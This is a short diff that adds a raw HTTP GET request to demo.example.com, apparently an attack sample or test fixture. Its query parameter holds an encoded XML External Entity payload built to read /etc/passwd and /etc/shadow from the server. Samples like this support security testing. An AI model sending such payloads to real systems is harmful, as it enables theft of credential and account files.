@@ -1,0 +1,4 @@
+GET /a?file=\u003C!DOCTYPE%20r%20[\u003C!ENTITY%20%%20p%20SYSTEM%20\u0022file:///etc/passwd\u0022\u003E\u003C!ENTITY%20%%20q%20\u0022\u003C!ENTITY%20x%20SYSTEM%20\u0027file:///etc/shadow\u0027\u003E\u0022\u003E%20%q\u003B]\u003E\u003Cr/\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
